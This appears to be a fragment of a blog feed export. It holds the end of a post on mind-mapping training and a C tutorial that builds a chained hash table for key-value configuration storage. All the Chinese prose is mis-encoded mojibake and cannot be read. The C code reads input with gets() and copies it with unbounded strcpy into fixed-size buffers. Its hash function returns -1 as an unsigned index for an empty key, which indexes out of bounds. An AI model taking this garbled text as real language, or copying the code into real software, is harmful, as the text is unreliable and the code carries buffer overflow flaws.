<p>æ ¹æ®å·¥ä½œæ€»ç»“çš„ç›®çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ€ç»´å¯¼å›¾åšå‡ºå·¥ä½œæ€»ç»“</p>
<p><img src="/assets/mindmap/summary_2.png" alt="summary 2"></p>
<p>ä¸Šé¢è¿™å‡ ä¸ªåº”ç”¨æ˜¯èŒåœºç»å¸¸èƒ½ç”¨åˆ°çš„ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå®ç”¨çš„æŠ€å·§ï¼ŒåŸ¹è®­è¿‡ç¨‹ä¸­é’ˆå¯¹å„ä¸ªåº”ç”¨æˆ‘ä»¬ä¹Ÿéƒ½æœ‰å®è·µæ“ä½œï¼Œä½†æ˜¯å¯¼å›¾åˆ¶ä½œæ¯”è¾ƒç²—ç³™ï¼Œå°±ä¸æ”¾è¿™äº†ã€‚</p>
<h2 id="æ€ç»´æ‹“å±•è®­ç»ƒ"><a href="#æ€ç»´æ‹“å±•è®­ç»ƒ" class="headerlink" title="æ€ç»´æ‹“å±•è®­ç»ƒ"></a>æ€ç»´æ‹“å±•è®­ç»ƒ</h2><p>ä»¥ä¸Šä¸€å¤§å †çš„ä¸œè¥¿éƒ½æ˜¯ä¸ºäº†è§£å†³å¼€å¤´è®²åˆ°çš„<strong>è®°ä¸ä½</strong>çš„é—®é¢˜ï¼Œä¸‹é¢æ¥çœ‹çœ‹<strong>ç†ä¸æ¸…</strong>å’Œ<strong>æƒ³ä¸å‡º</strong>è¿™ä¸¤ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ã€‚</p>
<h3 id="åˆ†ç±»è®­ç»ƒ"><a href="#åˆ†ç±»è®­ç»ƒ" class="headerlink" title="åˆ†ç±»è®­ç»ƒ"></a>åˆ†ç±»è®­ç»ƒ</h3><p><strong>ç†ä¸æ¸…</strong>çš„é—®é¢˜ï¼Œå°±æ˜¯æä¸æ¸…æ¥šå„ä¸ªå…³é”®è¯ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œä¸èƒ½å¾ˆå¥½çš„åˆ†æ¸…ä¸»æ¬¡ã€‚é‚£ä¹ˆåˆ†ç±»è®­ç»ƒå°±å°¤ä¸ºå¿…è¦äº†ï¼ŒæŠŠä¸€å †çœ‹ä¼¼æ‚ä¹±çš„äº‹ç‰©æ”¾åˆ°ä¸€èµ·ï¼Œå¯¹å…¶è¿›è¡Œåˆ†ç±»ï¼Œå¯ä»¥è®©æˆ‘ä»¬ç†æ¸…æ€è·¯ã€‚</p>
<p>è€Œåˆ†ç±»çš„å…³é”®æ˜¯<strong>ä¸é‡ä¸æ¼</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸é‡å¤ä¸é—æ¼ï¼Œå³<strong><a href="https://baike.baidu.com/item/MECE/7762637" target="_blank" rel="noopener">MECE</a></strong>ï¼ˆMutually Exclusive, Collectively Exhaustiveï¼‰,ç›¸äº’ç‹¬ç«‹ï¼Œå®Œå…¨ç©·å°½ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå°†ä»¥ä¸‹é£Ÿç‰©æŒ‰ç…§æŸç§æ–¹å¼è¿›è¡Œåˆ†ç±»ï¼š</p>
<ul>
<li>è‘¡è„ã€æ¡”å­ã€è‹¹æœã€åœŸè±†ã€çš®è›‹ã€èƒ¡èåœã€é¸¡è›‹ã€ç‰›å¥¶ã€é…¸å¥¶</li>
</ul>
<p>æœ‰å¾ˆå¤šåˆ†ç±»æ–¹å¼ï¼ŒæŒ‰æ°´æœå’Œéæ°´æœåˆ†ï¼š</p>
<ul>
<li>æ°´æœï¼šè‘¡è„ã€æ¡”å­ã€è‹¹æœ</li>
<li>éæ°´æœï¼šåœŸè±†ã€çš®è›‹ã€èƒ¡èåœã€é¸¡è›‹ã€ç‰›å¥¶ã€é…¸å¥¶</li>
</ul>
<p>æŒ‰è›‹å¥¶ç±»å’Œéè›‹å¥¶ç±»ï¼š</p>
<ul>
<li>è›‹å¥¶ï¼šçš®è›‹ã€é¸¡è›‹ã€ç‰›å¥¶ã€é…¸å¥¶</li>
<li>éè›‹å¥¶ï¼šè‘¡è„ã€æ¡”å­ã€è‹¹æœã€åœŸè±†ã€èƒ¡èåœ</li>
</ul>
<p>æœ‰äººå°±è¯´äº†ï¼ŒæŒ‰è›‹ç™½è´¨é«˜ä½åˆ†ç±»ï¼Œé‚£å¤šå°‘ç®—æ˜¯é«˜è›‹ç™½ã€å¤šå°‘åˆç®—æ˜¯ä½è›‹ç™½å‘¢ï¼Œå¦‚æœæ²¡æœ‰é‡åŒ–å°±ä¸å¥½åŒºåˆ†äº†ã€‚å½’æ ¹ç»“åº•ï¼Œåˆ†ç±»çš„å…³é”®æ˜¯<strong>ä¸é‡ä¸æ¼</strong>ã€‚</p>
<h3 id="è”æƒ³è®­ç»ƒ"><a href="#è”æƒ³è®­ç»ƒ" class="headerlink" title="è”æƒ³è®­ç»ƒ"></a>è”æƒ³è®­ç»ƒ</h3><p>è§£å†³äº†<strong>ç†ä¸æ¸…</strong>çš„é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±å‰©<strong>æƒ³ä¸å‡º</strong>äº†ï¼Œè„‘å­å¡å£³æƒ³ä¸å‡ºä¸œè¥¿ï¼Œè€å¸ˆæ€»ç»“çš„ä¸€å¥è¯</p>
<blockquote>
<p><strong>å…ˆå¼€èŠ±åæ¥é¾™</strong></p>
<p><strong>å¼€èŠ±</strong>ï¼šæƒ³æ³•éƒ½ä»ä¸»é¢˜å¼€å§‹è”æƒ³ï¼Œä»ä¸€åˆ°å¤šï¼Œå³å‘æ•£æ€ç»´ï¼Œå¯æ‰©å±•æ€ç»´çš„<strong>å¹¿åº¦</strong>å’Œ<strong>å®½åº¦</strong></p>
<p><strong>æ¥é¾™</strong>ï¼šæ¯ä¸€ä¸ªæƒ³æ³•éƒ½æ˜¯ä»å‰ä¸€ä¸ªæƒ³æ³•è”æƒ³å‡ºæ¥çš„ï¼Œç±»ä¼¼æˆè¯­æ¥é¾™ï¼Œå¯æ‰©å±•æ€ç»´çš„<strong>æ·±åº¦</strong>å’Œ<strong>ç²¾åº¦</strong></p>
</blockquote>
<p>ä¸ºäº†å¼€èŠ±æ¥é¾™ï¼Œè€å¸ˆè®²äº†ä¸‰ä¸ªé‡è¦æŠ€å·§ï¼š</p>
<ol>
<li>ä»æ­£åé¢ã€å†…å¤–éƒ¨ã€ç›¸è¿‘æ–¹å‘è”æƒ³</li>
<li>ä»äº”æ„Ÿï¼ˆè§†å¬è§¦å—…å‘³ï¼‰ç€å®è”æƒ³</li>
<li>5W2Hè”æƒ³</li>
</ol>
<p>ä¹‹åè€å¸ˆé€šè¿‡ä¸€ä¸ªä¾‹å­å¸®åŠ©åŠ æ·±å°è±¡ï¼Œé’ˆå¯¹<strong>å…šå‘˜æ´»åŠ¨</strong>è¿™ä¸ªä¸»é¢˜ï¼Œå‘æ•£æ€ç»´æƒ³ç‚¹å­ã€‚é¦–å…ˆä»å…³è”æ€§ï¼ŒåŒ…æ‹¬ç›¸åçš„ã€ç›¸è¿‘çš„ã€ç›¸å…³çš„ã€å†…éƒ¨çš„ã€å¤–éƒ¨çš„ã€ç›¸é€šçš„ç­‰æ–¹é¢è”æƒ³ï¼š</p>
<p><img src="/assets/mindmap/related.jpg" alt="related"></p>
<p>ä»äº”æ„Ÿè”æƒ³ï¼š</p>
<p><img src="/assets/mindmap/feeling.png" alt="feeling"></p>
<p>ä»5W2Hè”æƒ³ï¼š</p>
<p><img src="/assets/mindmap/5w2h.png" alt="5w2h"></p>
<p>ä¹‹åè€å¸ˆè®©æˆ‘ä»¬ä¾æ®è¿™ç§æ–¹æ³•å¯¹<strong>é™æœ¬å¢æ•ˆ</strong>è¿™ä¸ªä¸»é¢˜è¿›è¡Œå¤´è„‘é£æš´ï¼Œå‘æ•£æ€ç»´ï¼Œå¯æƒœå½“æ—¶æ²¡æ‹ç…§ã€‚ã€‚ã€‚è”æƒ³è®­ç»ƒå°±æ˜¯å…ˆä»å¹¿åº¦å‘æ•£ã€å†ä»æ·±åº¦é€’è¿›çš„è¿‡ç¨‹ï¼Œè¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæƒ³å‡ºå¥½çš„ç‚¹å­ã€‚</p>
<h2 id="æ€ç»´å¯¼å›¾è½¯ä»¶"><a href="#æ€ç»´å¯¼å›¾è½¯ä»¶" class="headerlink" title="æ€ç»´å¯¼å›¾è½¯ä»¶"></a>æ€ç»´å¯¼å›¾è½¯ä»¶</h2><p>æœ€åè€å¸ˆç»™æˆ‘ä»¬æ¨èäº†å‡ æ¬¾å¸¸è§çš„æ€ç»´å¯¼å›¾è½¯ä»¶ï¼Œç„¶è€Œè¿™äº›ä¸ªæˆ‘ä¹‹å‰éƒ½å·²ç»äº†è§£äº†ï¼Œä¹Ÿç”¨è¿‡ä¸€äº›ï¼Œä¸‹é¢çš„<code>MindManager</code>å’Œ<code>iMindMap</code>æ˜¯æ”¶è´¹çš„ï¼Œ<code>MindManger</code>æ›´é€‚åˆå·¥ä½œä¸­ç”¨ï¼Œ<code>iMindMap</code>æ˜¯å®Œå…¨æŒ‰ç…§æ‰˜å°¼åšèµå…ˆç”Ÿçš„è§„åˆ™ç ”å‘çš„ã€‚ç„¶è€Œæˆ‘ä¸€èˆ¬ä½¿ç”¨<code>ubuntu</code>ä½œä¸ºå¸¸ç”¨æ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥æ›´å–œæ¬¢ç™¾åº¦è„‘å›¾è¿™æ¬¾åœ¨çº¿æ€ç»´å¯¼å›¾è½¯ä»¶ã€‚</p>
<ul>
<li>Xmindï¼ˆå°å¦¹ï¼‰</li>
<li>MindManagerï¼ˆç¾çœ‰ï¼‰</li>
<li>iMindMapï¼ˆçˆ±ç¾çœ‰ï¼‰</li>
<li><a href="http://naotu.baidu.com" target="_blank" rel="noopener">ç™¾åº¦è„‘å›¾</a></li>
</ul>
<p>é‚£å‡ ä¸ªåç¼€æ˜¯åŸ¹è®­è€å¸ˆæ•™çš„ã€‚ã€‚ã€‚å¥½è®°ï¼æœ¬æ–‡çš„å‡ ä¸ªæ€ç»´å¯¼å›¾æ˜¯é€šè¿‡ç™¾åº¦è„‘å›¾ç»˜åˆ¶çš„ã€‚ç„¶è€Œè€å¸ˆå»ºè®®åœ¨ä½¿ç”¨è½¯ä»¶ä¹‹å‰ï¼Œæœ€å°‘æ‰‹ç»˜<strong>21</strong>ä¸ªæ€ç»´å¯¼å›¾ï¼Œä¸è¦é—®ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªæ•°ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œæˆ‘ä¹Ÿæ²¡æ•¢é—®ã€‚å°±åƒæœºæ¢°æ‰‹è¡¨çš„å¹¿å‘Šä¸­éƒ½æ˜¯10ç‚¹10åˆ†ä¸€æ ·ï¼Œæ²¡æœ‰ä¸ºä»€ä¹ˆï¼Œå°±æ˜¯å¥½çœ‹ã€‚ã€‚ã€‚</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åœ¨åŸ¹è®­ä¹‹å‰ï¼Œæˆ‘å·²ç»ç”¨è¿‡ä¸€æ®µæ—¶é—´çš„æ€ç»´å¯¼å›¾äº†ï¼Œä¸»è¦ç”¨äºæ¢³ç†ä»£ç é€»è¾‘å’Œåˆ¶å®šé¡¹ç›®è®¡åˆ’ã€‚æœ¬æ¬¡åŸ¹è®­åŠ æ·±äº†å¯¹æ€ç»´å¯¼å›¾çš„ç†è§£ï¼Œè§„èŒƒäº†å¯¼å›¾çš„ç»˜åˆ¶å’Œè¯»å›¾æŠ€å·§ï¼Œä¿®æ­£äº†å‡ ä¸ªä¹‹å‰ç»˜å›¾æ—¶æ²¡å¤ªæ³¨æ„çš„é—®é¢˜ï¼ŒåŒæ—¶ä¹ŸçŸ¥æ™“äº†å¯¼å›¾ç”¨é€”ä¹‹å¹¿ã€åŠŸèƒ½ä¹‹å¼ºï¼çš„ç¡®å€¼å¾—å­¦ä¹ å’Œåº”ç”¨ã€‚</p>
<p>æ­¤å¤–ï¼Œä¹Ÿæ‰©å±•å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼Œå¦‚åŸºäºMECEåŸåˆ™çš„åˆ†ç±»æ–¹æ³•ã€åŸºäºSMARTçš„ç›®æ ‡åˆ¶å®šã€å·¦é€»å³è‰ºçš„å¤§è„‘åˆ†å·¥ã€å…ˆå¼€èŠ±åæ¥é¾™çš„æ€ç»´å‘æ•£æŠ€å·§ç­‰ã€‚åœ¨ä»¥åçš„ç”Ÿæ´»ã€å­¦ä¹ å’Œå·¥ä½œä¸­ï¼Œç›¸ä¿¡é€šè¿‡æ€ç»´å¯¼å›¾å¯ä»¥æé«˜å„æ–¹é¢çš„åŠäº‹æ•ˆç‡ï¼ŒèŠ‚çº¦æ—¶é—´ã€‚æœ€åï¼Œå¸Œæœ›çœ‹åˆ°è¿™ä»½æ€»ç»“çš„æœ‰ç¼˜äººä¹Ÿèƒ½æœ‰æ‰€æ”¶è·ã€‚</p>
<h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>ä¸‹é¢æ˜¯æˆ‘å†™è¿™ç¯‡æ–‡ç« ä¹‹å‰ç»˜åˆ¶çš„å¤§çº²ï¼Œä¹Ÿæ˜¯ä¸€å¼ æ€ç»´å¯¼å›¾ï¼Œå¸®æˆ‘ç†æ¸…å†™ä½œæ–¹å‘å’Œæ€è·¯ã€‚</p>
<p><img src="/assets/mindmap/summary.jpeg" alt="summary"></p>
<h3 id="è€å¸ˆæ¨èä¹¦ç±"><a href="#è€å¸ˆæ¨èä¹¦ç±" class="headerlink" title="è€å¸ˆæ¨èä¹¦ç±"></a>è€å¸ˆæ¨èä¹¦ç±</h3><ul>
<li>ã€Šç»“æ„æ€§æ€ç»´ã€‹</li>
<li>ã€Šé‡‘å­—å¡”åŸç†ã€‹</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 5W2H </tag>
            
            <tag> MECE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å“ˆå¸Œè¡¨çš„å®ç°ä¸å¸¸è§æ“ä½œ]]></title>
      <url>https://www.litreily.top/2019/05/24/hash-table/</url>
      <content type="html"><![CDATA[<p>å‰æ®µæ—¶é—´åŸºäºæ•°ç»„å’Œå•é“¾è¡¨ä»¥æ‹‰é“¾æ³•å†™äº†ä¸ªå“ˆå¸Œè¡¨ï¼Œå®ç°äº†åŸºæœ¬çš„å¢åˆ æ”¹æŸ¥ï¼ˆ<code>CRUD</code>ï¼‰ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨ä¸€äº›é…ç½®å‚æ•°ï¼Œä¾¿ä»¥æ­¤æ–‡è®°å½•ä¸€ä¸‹ã€‚</p>
<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><pre><code class="c">#define TABLE_SIZE 101
#define KEY_SIZE 32
#define VALUE_SIZE 128
#define BUF_SIZE 256

#define DATA_PATH &quot;data.txt&quot;

struct linklist {
    char key[KEY_SIZE];
    char val[VALUE_SIZE];
    struct linklist *next;
};
struct linklist *hashtbl[TABLE_SIZE];
</code></pre>
<a id="more"></a>
<p>ç®€å•èµ·è§ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—ç¬¦æ•°ç»„åˆ†åˆ«ç”¨äºå­˜å‚¨é”®<code>key</code>å’Œå€¼<code>value</code>,æ¯ä¸ªé”®å€¼å¯¹éƒ½ä»¥å•é“¾è¡¨<code>linklist</code>çš„ä¸€ä¸ªèŠ‚ç‚¹å½¢å¼å­˜å‚¨ã€‚å“ˆå¸Œè¡¨<code>hashtbl</code>æ•°ç»„å­˜å‚¨æ¯ä¸ªå•é“¾è¡¨çš„å¤´éƒ¨æŒ‡é’ˆ<code>head</code>ã€‚</p>
<p><img src="/assets/hash/hash_table.jpg" alt="hash table"></p>
<h2 id="å“ˆå¸Œå‡½æ•°"><a href="#å“ˆå¸Œå‡½æ•°" class="headerlink" title="å“ˆå¸Œå‡½æ•°"></a>å“ˆå¸Œå‡½æ•°</h2><p>å¯¹äºå­—ç¬¦ä¸²çš„å“ˆå¸Œå‡½æ•°ï¼Œæˆ‘é€‰æ‹©äº†ã€Šç®—æ³•ã€‹ç¬¬4ç‰ˆæä¾›çš„ä¸€ç§å« Horner çš„ç»å…¸ç®—æ³•ï¼Œç”¨ N æ¬¡ä¹˜æ³•ã€åŠ æ³•å’Œå–ä½™æ¥è®¡ç®—ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ•£åˆ—å€¼ã€‚æ³¨æ„ä¹¦ä¸­çš„ç®—æ³•å®ç°å‡é‡‡ç”¨<code>java</code>è¯­è¨€â†“</p>
<pre><code class="java">hash = (R * hash + s.charAt(i)) % M;
</code></pre>
<p>å…¶ä¸­ï¼ŒRæ˜¯ä¸€ä¸ªç´ æ•°ï¼Œåªè¦å…¶è¶³å¤Ÿå°ï¼Œå°±èƒ½ä¿è¯hashåœ¨ï¼ˆ0ï½M-1ï¼‰ä¹‹å†…ã€‚è¿™é‡Œè®¾Rä¸º31ï¼ŒMå³å“ˆå¸Œè¡¨çš„é•¿åº¦ï¼Œä¸‹é¢å°±æ˜¯æ ¹æ®ä»¥ä¸Šç®—æ³•å®ç°çš„ä¸€ä¸ªå­—ç¬¦ä¸²å“ˆå¸Œå‡½æ•°ã€‚</p>
<pre><code class="c">/* calc hash code of string */
uint32_t hash(char *key) {
    int len = strlen(key);
    int i;
    uint32_t ret = 0;

    if(!len)
        return -1;

    for(i=0; i &lt; len; i++) {
        ret = (ret * 31 + (uint32_t)key[i]) % TABLE_SIZE;
    }

    return ret;
}
</code></pre>
<p>å­—ç¬¦ä¸²çš„å“ˆå¸Œå‡½æ•°è¿˜æœ‰å¾ˆå¤šï¼Œå…·ä½“å¯ä»¥å‚è€ƒ<a href="https://www.cnblogs.com/uvsjoh/archive/2012/03/27/2420120.html" target="_blank" rel="noopener">å­—ç¬¦ä¸²å“ˆå¸Œå‡½æ•°</a></p>
<h2 id="å¢åˆ æ”¹æŸ¥"><a href="#å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¢åˆ æ”¹æŸ¥"></a>å¢åˆ æ”¹æŸ¥</h2><p>ä¸Šé¢å®šä¹‰å¥½äº†å“ˆå¸Œè¡¨çš„å­˜å‚¨æ–¹å¼ï¼Œä»¥åŠå­—ç¬¦ä¸²çš„å“ˆå¸Œå‡½æ•°ï¼Œä¸‹é¢ä¾¿å¯ä»¥é€ä¸ªå®ç°å¯¹å“ˆå¸Œè¡¨çš„å¢åˆ æ”¹æŸ¥ã€‚</p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>é¦–å…ˆå®ç°å“ˆå¸Œè¡¨å…ƒç´ çš„å¢æ·»æˆ–æ›´æ”¹:</p>
<ol>
<li>è®¡ç®—å¾…æ’å…¥æˆ–æ›´æ–°é”®çš„å“ˆå¸Œå€¼</li>
<li>éå†å“ˆå¸Œå€¼æ‰€åœ¨é“¾è¡¨ï¼Œåˆ¤æ–­å½“å‰é”®æ˜¯å¦å·²å­˜åœ¨</li>
<li>è‹¥é”®ä¸å­˜åœ¨ï¼Œåˆ™åœ¨è¡¨å¤´æ’å…¥æ–°é”®ï¼›è‹¥å·²å­˜åœ¨ï¼Œåˆ™æ›´æ–°é”®å€¼</li>
</ol>
<p>æ’å…¥æ–°é”®æ—¶ä½¿ç”¨<code>malloc</code>åˆ†é…å†…å­˜ï¼ŒåŒæ—¶æ›´æ–°æ‰€åœ¨é“¾è¡¨çš„è¡¨å¤´</p>
<p><img src="/assets/hash/set_new_key.jpg" alt="set new key"></p>
<pre><code class="c">/* set or update value of key to hash table */
int set(char *key, char *val) {
    uint32_t i;
    struct linklist *l, *n;

    if(!key || !val)
        return -1;

    i = hash(key);

    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);

    if(l)
        strcpy(l-&gt;val, val);
    else {
        n = malloc(sizeof(struct linklist));
        if(!n)
            return -1;

        strcpy(n-&gt;key, key);
        strcpy(n-&gt;val, val);

        /* insert new key to the head of linklist */
        n-&gt;next = hashtbl[i];
        hashtbl[i] = n;
    }

    return 0;
}
</code></pre>
<h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>å¯¹é”®çš„åˆ é™¤å…¶å®å°±æ˜¯å¯¹ä¸€å—å†…å­˜çš„é‡Šæ”¾ï¼Œå…ˆè®¡ç®—å“ˆå¸Œå€¼ï¼Œéå†é“¾è¡¨æ‰¾åˆ°å¾…åˆ é™¤çš„é”®ï¼Œæœ€å<code>free</code>å³å¯ã€‚</p>
<p><img src="/assets/hash/unset_key.jpg" alt="unset key"></p>
<p>è¿™é‡Œéœ€è¦è€ƒè™‘çš„ä¸€ä¸ªé—®é¢˜æ˜¯å¦‚æœå¾…åˆ é™¤é”®å€¼å¯¹<code>l</code>æ˜¯è¡¨å¤´åç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œéœ€è¦å°†é“¾è¡¨è¡¨å¤´æŒ‡é’ˆç›´æ¥æŒ‡å‘<code>l-&gt;next</code>ã€‚</p>
<pre><code class="c">/* remove key from hash table */
int unset(char *key) {
    uint32_t i;
    struct linklist *l, *prev;

    if(!key)
        return -1;

    i = hash(key);

    for(prev = hashtbl[i], l = prev; l &amp;&amp; strcmp(key, l-&gt;key); prev = l, l = l-&gt;next);

    if(l) {
        if (l == prev)
            hashtbl[i] = l-&gt;next;
        else
            prev-&gt;next = l-&gt;next;
        free(l);
    }

    return 0;
}
</code></pre>
<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>è·å–é”®å€¼å°±éå¸¸ç®€å•äº†ï¼Œè®¡ç®—å“ˆå¸Œå€¼åç›´æ¥éå†é“¾è¡¨å³å¯ã€‚</p>
<pre><code class="c">/* get value of key from hash table */
char* get(char *key) {
    uint32_t i;
    struct linklist * l;

    if(!key)
        return NULL;

    i = hash(key);

    for(l = hashtbl[i]; l &amp;&amp; strcmp(key, l-&gt;key); l = l-&gt;next);

    return l ? l-&gt;val : NULL;
}
</code></pre>
<h2 id="å…¶å®ƒæ“ä½œ"><a href="#å…¶å®ƒæ“ä½œ" class="headerlink" title="å…¶å®ƒæ“ä½œ"></a>å…¶å®ƒæ“ä½œ</h2><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><code>show</code>å‡½æ•°ç”¨äºæ˜¾ç¤ºå“ˆå¸Œè¡¨å½“å‰å­˜å‚¨çš„æ‰€æœ‰æ•°æ®ï¼Œå®ç°æ–¹æ³•å³å¾ªç¯éå†å“ˆå¸Œè¡¨ï¼Œç„¶åæ‰“å°å‡ºæ¯ä¸ªé“¾è¡¨èŠ‚ç‚¹å­˜å‚¨çš„é”®å€¼å¯¹ã€‚æ¯è¡Œæ‰“å°ä¸€ç»„é”®å€¼å¯¹ï¼Œå¹¶ä¸”é”®å€¼å¯¹ä¹‹å‰ä¼šæ‰“å°å‡ºå½“å‰é”®å¯¹åº”çš„å“ˆå¸Œå‡½æ•°è®¡ç®—ç»“æœã€‚</p>
<pre><code class="c">/* show all the keys &amp; values of hash table */
void show() {
    int i;
    struct linklist *l;

    __nprintf(&quot;---------------------------------------&quot;);
    for(i = 0; i &lt; TABLE_SIZE; i++)
        for(l = hashtbl[i]; l != NULL; l = l-&gt;next)
            __nprintf(&quot;%d\t%s=\&quot;%s\&quot;&quot;, hash(l-&gt;key), l-&gt;key, l-&gt;val);
    __nprintf(&quot;---------------------------------------&quot;);
}
</code></pre>
<p>å‡½æ•°ä¸­ç”¨åˆ°çš„<code>__nprintf</code>å‡½æ•°å¦‚ä¸‹ï¼Œæ˜¯é€šè¿‡å‘ç»ˆç«¯<code>/dev/tty</code>å†™å…¥æ•°æ®å®Œæˆå¯¹æ•°æ®çš„ç»ˆç«¯æ˜¾ç¤ºï¼Œæ³¨æ„ä¸åŒæ“ä½œç³»ç»Ÿçš„ç»ˆç«¯è®¾å¤‡è·¯å¾„å¯èƒ½ä¸å¤ªä¸€æ ·ï¼Œä¾‹å¦‚åµŒå…¥å¼Linuxç³»ç»Ÿå¯èƒ½ä½¿ç”¨çš„æ˜¯<code>dev/console</code>.</p>
<pre><code class="c">/* use this &#39;__nprintf&#39; to print message */
void __nprintf(const char *fmt, ...) {
    va_list ap;
    static FILE *filp;

    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/tty&quot;, &quot;a&quot;)) == NULL)
        return;

    va_start(ap, fmt);
    vfprintf(filp, fmt, ap);
    fputs(&quot;\n&quot;, filp);
    va_end(ap);
}
</code></pre>
<h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>é™¤äº†å°†æ•°æ®æ˜¾ç¤ºåœ¨ç»ˆç«¯å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸‹é¢çš„<code>commit</code>å‡½æ•°å°†æ•°æ®å­˜å…¥æ–‡ä»¶å½“ä¸­ï¼Œè¯¥æ–‡ä»¶å°±å¯ä»¥å……å½“æœ€ç®€æ˜“çš„æ•°æ®åº“ã€‚</p>
<pre><code class="c">/* save all keys &amp; values from memory to local file */
int commit() {
    int i;
    struct linklist *l;
    char buf[BUF_SIZE];
    FILE *fp;

    fp = fopen(DATA_PATH, &quot;w&quot;);

    if(!fp)
        return -1;

    for(i = 0; i &lt; TABLE_SIZE; i++) {
        for(l = hashtbl[i]; l != NULL; l = l-&gt;next) {
            snprintf(buf, BUF_SIZE, &quot;%s=\&quot;%s\&quot;\n&quot;, l-&gt;key, l-&gt;val);
            fputs(buf, fp);
        }
    }

    fclose(fp);
    return 0;
}
</code></pre>
<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>æ—¢ç„¶ä¸Šé¢æåˆ°äº†æ•°æ®å­˜å‚¨ï¼Œé‚£è‡ªç„¶å°±å°‘ä¸äº†æ•°æ®è¯»å–ï¼Œå°†å­˜å…¥æ–‡ä»¶çš„æ•°æ®åŠ è½½åˆ°å†…å­˜å½“ä¸­ï¼Œä½œä¸ºè¿›ç¨‹å¯åŠ¨çš„é¦–ä¸ªä»»åŠ¡ï¼Œè¿™ä¾¿æ˜¯<code>load</code>å‡½æ•°æ‰€å®Œæˆçš„å·¥ä½œã€‚</p>
<pre><code class="c">/* load keys &amp; values from local file to memory */
int load() {
    int i;
    struct linklist *l;
    char buf[BUF_SIZE]={0};
    char *key, *val;
    FILE *fp;

    fp = fopen(DATA_PATH, &quot;r&quot;);

    if(!fp)
        return -1;

    while(fgets(buf, BUF_SIZE, fp)) {
        key = strtok(buf, &quot;=&quot;);
        val = strtok(NULL, &quot;\&quot;\n&quot;);
        set(key, val);
    }

    fclose(fp);
    return 0;
}
</code></pre>
<p>è‡³æ­¤ï¼Œä¸å“ˆå¸Œè¡¨çš„åŸºæœ¬æ“ä½œå‡½æ•°éƒ½å·²å®ç°ï¼Œä¸‹é¢å°†ä½¿ç”¨è¿™äº›åŸºæœ¬å‡½æ•°å®ç°å¯¹å“ˆå¸Œè¡¨çš„ä¸€äº›å¸¸è§æ“ä½œâ†“</p>
<h2 id="åº”ç”¨å®ä¾‹"><a href="#åº”ç”¨å®ä¾‹" class="headerlink" title="åº”ç”¨å®ä¾‹"></a>åº”ç”¨å®ä¾‹</h2><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>ä¸‹é¢å®ç°ä¸€ä¸ª<code>hash</code>ç¨‹åºï¼Œå¯¹å“ˆå¸Œè¡¨è¿›è¡Œäº¤äº’å¼æ“ä½œï¼Œç¨‹åºä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å¯åŠ¨æ—¶åŠ è½½å­˜å‚¨æ–‡ä»¶ä¸­çš„æ•°æ®åˆ°å“ˆå¸Œè¡¨</li>
<li>ä»ç»ˆç«¯ä¸æ–­è·å–ç”¨æˆ·æŒ‡ä»¤ï¼Œå®Œæˆæ•°æ®çš„å¢åˆ æ”¹æŸ¥ä¸å­˜å‚¨ï¼Œä»¥åŠç¨‹åºçš„å¸®åŠ©ä¿¡æ¯åŠé€€å‡º</li>
</ol>
<pre><code class="c">#include &quot;hash.h&quot;

static void help() {
    __nprintf(&quot;  help \t\t--show this infomation\n&quot; \
          &quot;  set key val \t--set or update value of key\n&quot; \
          &quot;  unset key \t--remove key from hash table\n&quot; \
          &quot;  get key \t--show value of key\n&quot; \
          &quot;  show \t\t--show all keys &amp; values of hash table\n&quot; \
          &quot;  commit \t--write all keys &amp; values to local file\n&quot; \
          &quot;  exit \t\t--exit current session&quot;
          );
}

int main(int argc, char *argv[]) {
    char cmd[128]={0};
    char *action, *key, *val;

    load();
    while(1) {
        printf(&quot;CMD&gt; &quot;);
        gets(cmd);

        key = NULL;
        val = NULL;

        action = strtok(cmd, &quot; &quot;);
        if(!action)
            continue;

        if(!strcmp(action, &quot;set&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            val = strtok(NULL, &quot;\n&quot;);
            set(key, val);
        }
               else if (!strcmp(action, &quot;unset&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            unset(key);
        }
        else if (!strcmp(action, &quot;get&quot;)) {
            key = strtok(NULL, &quot; &quot;);
            val = get(key);
            if(val)
                __nprintf(&quot;%s=\&quot;%s\&quot;&quot;, key, val);
        }
